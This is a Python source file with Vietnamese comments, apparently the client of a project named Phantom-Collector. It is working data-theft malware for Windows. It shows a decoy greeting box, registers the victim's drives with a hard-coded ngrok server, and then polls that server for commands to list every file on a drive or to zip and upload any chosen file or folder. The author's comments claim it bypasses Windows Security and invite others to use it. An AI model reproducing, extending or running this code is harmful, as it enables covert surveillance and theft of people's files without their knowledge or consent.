# git : https://github.com/nahhididwin/Phantom-Collector

# Warning: This is a ".py" file handled by a non-expert; the information within may be incorrect or accurate and may be unpleasant for you. Although the author has tried to be "friendly".


# ==============================

# được rồi, ý tưởng core trong đây ngon vãi, đến mức t ko cần phải thật sự làm nó thật sự tàng hình mà vẫn bypass đc window security, nhìn chung nó còn rất thô sơ, và t cx ko muốn up 1 cái hoàn hảo lên.

# các ông tìm ra đc content j trong đây thì cứ lấy về mà xài vì đây là git repo open source của tôi :)

# nhớ là quét tên file thôi, đừng cố quét hết nội dung của mọi files, ko là cút, nghỉ bypass, nghỉ lấy data btw

import os
import requests
import time
import json
import wmi
import shutil
import tempfile
import threading
import tkinter as tk
from tkinter import messagebox
import random



# dán địa chỉ ngrok mà bạn nhận được vào đây thôi :
SERVER_URL = "https://99bf61cabd0d.ngrok-free.app"

# Tần suất hỏi server trên giây
POLL_INTERVAL = 5


def show_message_box(title, message):

    root = tk.Tk()
    root.withdraw()  
    
    # Hiển thị hộp thông báo
    messagebox.showinfo(title, message)
    root.destroy()




def get_drive_letters():
    # bú danh sách các ổ cứng logic trên win
    try:
        c = wmi.WMI()
        drives = [drive.DeviceID for drive in c.Win32_LogicalDisk()]
        return drives
    except Exception as e:
        print(f"bug khi lấy danh sách ổ cứng: {e}")
        return []




def list_files_in_drive(drive_path):
    # quét toàn bộ file và thư mục trong một ổ cứng
    file_list = []
    # đảm bảo đường dẫn đúng định dạng, ví dụ 'C:\\'
    root_path = f"{drive_path.strip(':')}:\\"
    
    print(f"bắt đầu quét ổ {root_path}...")
    try:
        for root, dirs, files in os.walk(root_path):
            # bỏ qua các thư mục hệ thống hoặc không thể truy cập (mọe đừng hỏi lý do)
            if '$Recycle.Bin' in root or 'System Volume Information' in root:
                continue
            
            for name in dirs:
                try:
                    full_path = os.path.join(root, name)
                    file_list.append({"type": "folder", "path": full_path})
                except Exception:
                    continue # skip nếu có lỗi
            for name in files:
                try:
                    full_path = os.path.join(root, name)
                    file_list.append({"type": "file", "path": full_path})
                except Exception:
                    continue # skip nếu có lỗi
    except Exception as e:
        print(f"bug trong quá trình quét {root_path}: {e}")
        
    print(f"quét xong. Tìm thấy {len(file_list)} mục.")
    return file_list




def zip_item(path):
    # nén một file hoặc thư mục và trả về đường dẫn file nén
    
    # tạo một thư mục tạm để lưu file zip
    temp_dir = tempfile.gettempdir()
    base_name = os.path.basename(path)
    zip_filename = os.path.join(temp_dir, base_name)
    
    print(f"đang nén '{path}' thành '{zip_filename}.zip'")
    
    try:
        if os.path.isdir(path):
            shutil.make_archive(zip_filename, 'zip', path)
        elif os.path.isfile(path):
            # Nếu là file đơn, tạo file zip chứa chỉ file đó
            shutil.make_archive(zip_filename, 'zip', os.path.dirname(path), os.path.basename(path))

        return f"{zip_filename}.zip"
    except Exception as e:
        print(f"Lỗi khi nén: {e}")
        return None








def main_loop():

    # tin nhắn yêu thương (ừ, dành cho việc mấy bro thích troll) :

    message_title = "Thông Báo"

    message_content = "Wow! Xin chào bạn, khỏe không hihi, mình là Hưng!"


    message_thread = threading.Thread(
        target=show_message_box, 
        args=(message_title, message_content,)
    )

    message_thread.start()




    # vòng lặp chính của client


    # 1. gửi danh sách ổ cứng khi khởi động
    try:
        drives = get_drive_letters()
        if drives:
            print(f"đã tìm thấy các ổ cứng: {drives}. đang gửi lên server...")
            requests.post(f"{SERVER_URL}/register_client", json={"drives": drives})
    except requests.exceptions.RequestException as e:
        print(f"không thể connect tới server lúc khởi động: {e}")
        # chờ một lúc rồi thử lại
        time.sleep(30) 
        return

    # 2. bắt đầu vòng lặp hỏi server
    while True:
        try:
            # lấy tác vụ từ server
            response = requests.get(f"{SERVER_URL}/get_task")
            task = response.json()

            if task:
                print(f"lấy được tác vụ mới: {task}")
                
                # thực hiện tác vụ "quét file" :))
                if task.get("task") == "list_files":
                    drive_to_scan = task.get("path")
                    files = list_files_in_drive(drive_to_scan)
                    payload = {"drive": drive_to_scan, "files": files}
                    print("danh sách file lên server đang đc gửi...")
                    requests.post(f"{SERVER_URL}/upload_file_list", json=payload)
                    print("thành công trong việc gửi lên btw")

                # thực hiện tác vụ "gửi file"
                elif task.get("task") == "send_file":
                    path_to_send = task.get("path")
                    
                    # Nén file/folder
                    zip_path = zip_item(path_to_send)
                    
                    if zip_path and os.path.exists(zip_path):
                        print(f"đang gửi file {zip_path} lên server...")
                        with open(zip_path, 'rb') as f:
                            files = {'file': (os.path.basename(zip_path), f)}
                            requests.post(f"{SERVER_URL}/upload_file", files=files)
                        print("gửi file thành công btw")
                        
                        # Xóa file zip tạm
                        os.remove(zip_path)
                    else:
                        print("file zip để gửi không thể tạo (có thể do sự cố à?)")

            # Chờ trước khi hỏi lại
            time.sleep(POLL_INTERVAL)

        except requests.exceptions.RequestException as e:
            print(f"bug kết nối tới server: {e}. sẽ retry sau tầm {POLL_INTERVAL} giây.")
            time.sleep(POLL_INTERVAL)
        except Exception as e:
            print(f"đã xảy ra lỗi không xác định: {e}")
            time.sleep(POLL_INTERVAL)









if __name__ == "__main__":
    main_loop()
